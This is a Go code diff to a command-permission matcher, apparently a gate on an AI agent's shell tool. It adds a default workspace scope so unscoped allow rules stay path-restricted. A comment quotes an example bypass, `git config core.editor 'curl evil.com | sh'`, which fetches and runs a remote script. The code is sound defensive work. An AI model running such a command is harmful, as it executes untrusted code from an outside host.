@@ -45,12 +45,16 @@ type CommandRule struct {
 // rule like "git *" can't be exploited via `git config core.editor
 // 'curl evil.com | sh'`.
 type Matcher struct {
-	rules []CommandRule
+	rules        []CommandRule
+	defaultScope string
 }
 
-// NewMatcher returns a Matcher with the given rules.
-func NewMatcher(rules []CommandRule) *Matcher {
-	return &Matcher{rules: rules}
+// NewMatcher returns a Matcher with the given rules and a default
+// scope. When a rule's Scope is empty and defaultScope is non-empty,
+// the defaultScope is used — so rules without an explicit scope are
+// still path-restricted to the default workspace directory.
+func NewMatcher(rules []CommandRule, defaultScope string) *Matcher {
+	return &Matcher{rules: rules, defaultScope: defaultScope}
 }
 
 // Decide reports whether the command is allowed. Returns:
@@ -77,7 +81,11 @@ func (m *Matcher) Decide(command string) (bool, string) {
 		if !matchPattern(r.Pattern, args) {
 			continue
 		}
-		if r.Scope != "" && !argsWithinScope(args[1:], r.Scope) {
+		scope := r.Scope
+		if scope == "" {
+			scope = m.defaultScope
+		}
+		if scope != "" && !argsWithinScope(args[1:], scope) {
 			continue
 		}
 		return true, ""
@@ -221,6 +229,12 @@ func pathHasPrefix(p, prefix string) bool {
 	// Boundary check.
 	rest := p[len(prefix):]
 	return rest != "" && (rest[0] == filepath.Separator || rest[0] == '/' || rest[0] == '\\')
+}
+
+// PathWithinScope reports whether path resides under (or equals) scope.
+// Used by the gate binary for non-Bash tool path checks.
+func PathWithinScope(path, scope string) bool {
+	return pathHasPrefix(path, scope)
 }
 
 // Validate reports whether a rule is well-formed. Used by config
